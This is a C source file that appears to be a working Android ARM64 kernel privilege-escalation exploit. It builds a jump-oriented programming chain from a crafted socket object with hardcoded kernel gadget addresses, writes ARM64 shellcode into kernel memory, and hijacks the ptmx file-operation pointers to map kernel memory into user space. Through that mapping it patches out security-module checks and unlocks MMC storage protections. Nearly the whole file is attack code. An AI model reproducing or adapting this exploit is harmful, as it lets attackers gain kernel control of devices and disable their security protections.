#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include "poc.h"

#define PAGE_START_ADDRESS(m,s) (((addr_t)(m)) & ~((s) - 1))
#define PAGE_END_ADDRESS(m,s)   (((addr_t)(m)) | ((s) - 1))

#define OFFSET_SK_PROT          0x28
#define OFFSET_SK_STAMP         0x1f8
#define OFFSET_MC_LIST          0x2b0

#define MIN_SK_SIZE             (OFFSET_MC_LIST + sizeof (addr_t))

#define STORE_JOP_RESULT        680

#define NUM_JOP_FUNC            3

#define KERNEL_BASE	        0xffffffc000000000L
#define KERNEL_SIZE             0x0000000002000000L

#define VMALLOC_ADDRESS_DUMMY   0xffffff80ffffffffL

#define PTMX_FOPS               0xffffffc001923410L
#define FOPS_MMAP_OFFSET        10
#define FOPS_FSYNC_OFFSET       14

#define MMAP_ADDRESS            0x0000000020000000L

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))


static addr_t kernel_stack;
static addr_t *exec_addr_ptr;
static addr_t exec_addr;


addr_t
get_sk_timestamp_offset(void)
{
  return OFFSET_SK_STAMP;
}

int
get_num_jop_func(void)
{
  return NUM_JOP_FUNC;
}

int
setup_jop_chain(addr_t sk, int func_num)
{
  addr_t page_start;
  addr_t page_end;
  addr_t kernel_func;
  addr_t prot_user;
  addr_t offset;
  size_t pagesize;
  static unsigned char work_buf[1024];
  addr_t work;
  addr_t *p;

  work = (addr_t)work_buf;

  pagesize = get_page_size();

  page_start = PAGE_START_ADDRESS(sk, pagesize);
  page_end = PAGE_END_ADDRESS(sk + MIN_SK_SIZE, pagesize);

  memset((void *)page_start, 0, (page_end + 1) - page_start);

  switch (func_num) {
  case 0:
    kernel_func = (addr_t)0xffffffc00041b1d0L;

    p = (addr_t *)(sk + 8);
    *p = 0xffffffc000272eccL;

    p = (addr_t *)(sk + 16);
    *p = 0xffffffc00024a988L;

    p = (addr_t *)(sk + 64);
    *p = work;

    p = (addr_t *)(work + 8);
    *p = 0xffffffc000b70484L;

    p = (addr_t *)(sk + STORE_JOP_RESULT);
    *p = 0;

    break;

  case 1:
    kernel_func = (addr_t)0xffffffc00050ff54L;

    p = (addr_t *)(sk + 208);
    *p = (addr_t)-1L;

    p = (addr_t *)(sk + 320);
    *p = work;

    p = (addr_t *)(sk + 80);
    *p = 0xffffffc00041fd58L;

    p = (addr_t *)(sk + 24);
    *p = get_ptr_addr_limit(kernel_stack) - 56;

    p = (addr_t *)(sk + 56);
    *p = (addr_t)-1L;

    p = (addr_t *)(sk + 88);
    *p = work;

    p = (addr_t *)(work + 16);
    *p = 0xffffffc000b70484L;

    break;

  case 2:
    kernel_func = (addr_t)0xffffffc00050ff54L;

    p = (addr_t *)(sk + 208);
    *p = (addr_t)-1L;

    p = (addr_t *)(sk + 320);
    *p = work;

    p = (addr_t *)(sk + 24);
    *p = 4096;

    p = (addr_t *)(sk + 80);
    *p = 0xffffffc0002fef74L;

    p = (addr_t *)(sk + 48);
    *p = 0xffffffc0002e715cL;

    p = (addr_t *)(sk + 88);
    *p = 0xffffffc000b55290L;

    p = (addr_t *)(sk + 1024);
    *p = work;

    p = (addr_t *)(work + 72);
    *p = 0xffffffc000b70484L;

    exec_addr_ptr = (addr_t *)(sk + 1400);
    *exec_addr_ptr = VMALLOC_ADDRESS_DUMMY;

    break;

  default:
    kernel_func = (addr_t)0xffffffc000b70484L;
  }

  prot_user = page_start;
  offset = sk - page_start;

  if (offset < sizeof (addr_t)) {
    prot_user = (page_end + 1) - sizeof (addr_t);
  }

  p = (addr_t *)(sk + OFFSET_SK_PROT);
  *p = prot_user;

  p = (addr_t *)prot_user;
  *p = kernel_func;

  return 0;
}

static int install_fops_handler(void);
static int set_kernel_cred(void);

void
func_after_jop(addr_t sk, int func_num)
{
  switch (func_num) {
  case 0:
    kernel_stack = *(addr_t *)(sk + STORE_JOP_RESULT);
    break;

  case 1:
    break;

  case 2:
    exec_addr = *exec_addr_ptr;
    if (exec_addr == VMALLOC_ADDRESS_DUMMY) {
      printf("vmalloc_exec(): failed\n");
      break;
    }

    if (install_fops_handler() == -1) {
      break;
    }

    if (set_kernel_cred() == -1) {
      break;
    }

    break;

  default:
    break;
  }
}

const unsigned int do_mmap64[] = {
  0xaa0103e0,
  0xd2979805,
  0xa9bf7bfd,
  0xf2a005a5,
  0xd2800002,
  0x910003fd,
  0xf9400021,
  0xf2dff805,
  0xf9400403,
  0xf2ffffe5,
  0xf9402404,
  0xcb010063,
  0xd63f00a0,
  0xa8c17bfd,
  0xd65f03c0,
  0
};

const unsigned int do_fsync64[] = {
  0xd284d701,
  0xd2800000,
  0xa9bf7bfd,
  0xf2a00481,
  0xf2dff801,
  0x910003fd,
  0xf2ffffe1,
  0xd63f0020,
  0xd2846b01,
  0xf2a00481,
  0xf2dff801,
  0xf2ffffe1,
  0xd63f0020,
  0x52800000,
  0xa8c17bfd,
  0xd65f03c0,
  0
};

static int
install_fops_handler(void)
{
  addr_t addr;
  addr_t func;

  if (write_kernel_memory_by_pipe(exec_addr, do_mmap64, sizeof do_mmap64) != sizeof (do_mmap64)) {
    printf("install_fops_handler(): write failed at 0x%08lx\n", exec_addr);
    return -1;
  }

  if (write_kernel_memory_by_pipe(exec_addr + sizeof (do_mmap64), do_fsync64, sizeof do_fsync64) != sizeof (do_fsync64)) {
    printf("install_fops_handler(): write failed at 0x%08lx\n", exec_addr);
    return -1;
  }

  addr = PTMX_FOPS + FOPS_MMAP_OFFSET * sizeof (func);
  func = 0;

  if (read_kernel_memory_by_pipe(addr, &func, sizeof func) != sizeof (func)) {
    printf("install_fops_handler(): read failed at 0x%08lx\n", addr);
    return -1;
  }

  if (func != 0) {
    printf("install_fops_handler(): ptmx_mmap: already installed. overwrite it\n");
  }

  func = exec_addr;

  if (write_kernel_memory_by_pipe(addr, &func, sizeof (func)) != sizeof (func)) {
    printf("install_fops_handler(): write failed at 0x%08lx\n", addr);
    return -1;
  }

  addr = PTMX_FOPS + FOPS_FSYNC_OFFSET * sizeof (func);
  func = 0;

  if (read_kernel_memory_by_pipe(addr, &func, sizeof func) != sizeof (func)) {
    printf("install_fops_handler(): read failed at 0x%08lx\n", addr);
    return -1;
  }

  if (func != 0) {
    printf("install_fops_handler(): ptmx_fsync: already installed. overwrite it\n");
  }

  func = exec_addr + sizeof (do_mmap64);

  if (write_kernel_memory_by_pipe(addr, &func, sizeof (func)) != sizeof (func)) {
    printf("install_fops_handler(): write failed at 0x%08lx\n", addr);
    return -1;
  }

  return 0;
}

static addr_t
convert_kernel_to_mapped_address(addr_t addr)
{
  return addr - KERNEL_BASE + MMAP_ADDRESS;
}

static addr_t
read_kernel(addr_t addr)
{
  addr_t *p;

  p = (addr_t *)convert_kernel_to_mapped_address(addr);
  return *p;
}

static void
write_kernel(addr_t addr, addr_t value)
{
  addr_t *p;

  p = (addr_t *)convert_kernel_to_mapped_address(addr);
  *p = value;
}

static int
unlock_lsm(int fd)
{
  addr_t addr;
  addr_t save;

  write_kernel(0xffffffc000e32950, 0xffffffc0003fa770);
  write_kernel(0xffffffc000e32998, 0xffffffc0003fa858);
  write_kernel(0xffffffc000e329b0, 0xffffffc0003fa878);
  write_kernel(0xffffffc000e329c0, 0xffffffc0003fa888);
  write_kernel(0xffffffc000e32b70, 0xffffffc0003f7a48);

  write_kernel(0xffffffc0004120bc, 0xd65f03c052800000);
  write_kernel(0xffffffc00041211c, 0xd65f03c052800000);
  write_kernel(0xffffffc000412324, 0xd65f03c052800000);
  write_kernel(0xffffffc0004128f0, 0xd65f03c052800000);
  write_kernel(0xffffffc00041277c, 0xd65f03c052800000);

  write_kernel(0xffffffc00040d5b8, 0x9107e2a014000086);
  write_kernel(0xffffffc00040d834, 0x9107e2a014000033);

  addr = PTMX_FOPS + FOPS_FSYNC_OFFSET * sizeof (addr_t);
  save = read_kernel(addr);
  write_kernel(addr, 0xffffffc0003fa6c4);
  fsync(fd);
  write_kernel(addr, save);

  return 0;
}

static int
unlock_mmc(int fd)
{
  write_kernel(0xffffffc000ea8c10, 0x200000000);
  write_kernel(0xffffffc000ea8c18, 0x200000005);
  write_kernel(0xffffffc000ea8c20, 0x200000009);
  write_kernel(0xffffffc000ea8c28, 0x20000000a);
  write_kernel(0xffffffc000ea8c30, 0x20000000b);
  write_kernel(0xffffffc000ea8c38, 0x20000000c);
  write_kernel(0xffffffc000ea8c40, 0x20000000d);
  write_kernel(0xffffffc000ea8c48, 0x20000000e);
  write_kernel(0xffffffc000ea8c50, 0x20000000f);
  write_kernel(0xffffffc000ea8c58, 0x200000010);
  write_kernel(0xffffffc000ea8c60, 0x200000011);
  write_kernel(0xffffffc000ea8c68, 0x200000012);
  write_kernel(0xffffffc000ea8c70, 0x200000013);
  write_kernel(0xffffffc000ea8c78, 0x200000014);
  write_kernel(0xffffffc000ea8c80, 0x200000015);
  write_kernel(0xffffffc000ea8c88, 0x200000016);
  write_kernel(0xffffffc000ea8c90, 0x200000017);
  write_kernel(0xffffffc000ea8c98, 0x200000018);
  write_kernel(0xffffffc000ea8ca0, 0x200000019);
  write_kernel(0xffffffc000ea8ca8, 0x20000001a);
  write_kernel(0xffffffc000ea8cb0, 0x20000001b);
  write_kernel(0xffffffc000ea8cb8, 0x20000001d);
  write_kernel(0xffffffc000ea8cc0, 0x20000001e);
  write_kernel(0xffffffc000ea8cc8, 0x20000001f);

  return 0;
}

static int
clean_up(int fd)
{
  write_kernel(PTMX_FOPS + FOPS_MMAP_OFFSET * sizeof (addr_t), 0);
  write_kernel(PTMX_FOPS + FOPS_FSYNC_OFFSET * sizeof (addr_t), 0);
}


static int
set_kernel_cred(void)
{
  void *mmap_address;
  int fd;

  fd = open("/dev/ptmx", O_RDWR);
  if (fd == -1) {
    perror("ptmx open");
    return -1;
  }

  mmap_address = mmap((void *)MMAP_ADDRESS, KERNEL_SIZE,
                      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                      fd, 0);

  if (mmap_address == MAP_FAILED) {
    perror("ptmx mmap");
    close(fd);
  }

  unlock_lsm(fd);
  unlock_mmc(fd);

  fsync(fd);

  clean_up(fd);

  munmap(mmap_address, KERNEL_SIZE);
  close(fd);

  return 0;
}
